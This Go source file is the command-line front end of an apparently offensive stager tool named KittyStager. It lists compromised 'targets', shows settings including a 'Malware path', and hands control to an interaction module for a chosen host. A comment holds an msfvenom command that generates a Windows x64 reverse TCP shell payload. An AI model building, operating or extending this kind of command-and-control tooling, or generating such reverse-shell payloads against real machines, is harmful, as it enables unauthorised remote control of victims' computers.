package cli

import (
	"GoStager/config"
	"GoStager/http"
	"GoStager/interact"
	"GoStager/util"
	"fmt"
	i "github.com/JoaoDanielRufino/go-input-autocomplete"
	"github.com/c-bata/go-prompt"
	color "github.com/logrusorgru/aurora"
	"strconv"
)

//msfvenom -p windows/x64/shell_reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444

func completer(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "exit", Description: "Exit the program"},
		{Text: "config", Description: "Show config"},
		{Text: "target", Description: "Show targets"},
		{Text: "interact", Description: "Interact with a target"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

func Cli(conf config.General) error {
	for {
		t := prompt.Input("KittyStager 🐈❯ ", completer)
		switch t {
		case "exit":
			return nil
		case "config":
			fmt.Printf("\n%s\t\t%s\n", color.Green("Host:"), color.Yellow(conf.GetHost()))
			fmt.Printf("%s\t\t%d\n", color.Green("Port:"), color.Yellow(conf.GetPort()))
			fmt.Printf("%s\t%s\n", color.Green("Endpoint:"), color.Yellow(conf.GetEndpoint()))
			fmt.Printf("%s\t%s\n", color.Green("UserAgent:"), color.Yellow(conf.GetUserAgent()))
			fmt.Printf("%s\t\t%d\n", color.Green("Sleep:"), color.Yellow(conf.GetSleep()))
			for _, v := range conf.GetMalPath() {
				fmt.Printf("%s\t%s\n", color.Green("Malware path:"), color.Yellow(v))
			}
			fmt.Println()
		case "target":
			printTarget()
		case "interact":
			printTarget()
			fmt.Printf("%s\n", color.Yellow("\n[*] Please enter the ip of the target"))
			in, err := i.Read("Id: ")
			if err != nil {
				util.ErrPrint(err)
				break
			}
			id, err := strconv.Atoi(in)
			if util.Contains(http.Target, http.Target[id]) == false {
				util.ErrPrint(fmt.Errorf("invalid id"))
				break
			}
			fmt.Println()
			err = interact.Interact(http.Target[id])
			if err != nil {
				return err
			}
		}
	}
}

func printTarget() {
	fmt.Printf("%s\n", color.Green("[*] Targets:"))
	for id, x := range http.Target {
		fmt.Printf("%d - %s\n", id, color.Yellow(x))
	}
}
